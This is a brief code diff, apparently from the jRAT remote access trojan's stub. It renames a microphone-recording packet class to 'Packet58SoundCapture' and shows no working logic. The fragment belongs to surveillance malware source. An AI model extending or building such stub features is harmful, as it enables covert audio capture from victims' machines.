@@ -6,7 +6,7 @@ import pro.jrat.common.io.StringWriter;
 import pro.jrat.stub.Connection;
 
 
-public class Packet58Microphone extends AbstractOutgoingPacket {
+public class Packet58SoundCapture extends AbstractOutgoingPacket {
 
 	@Override
 	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
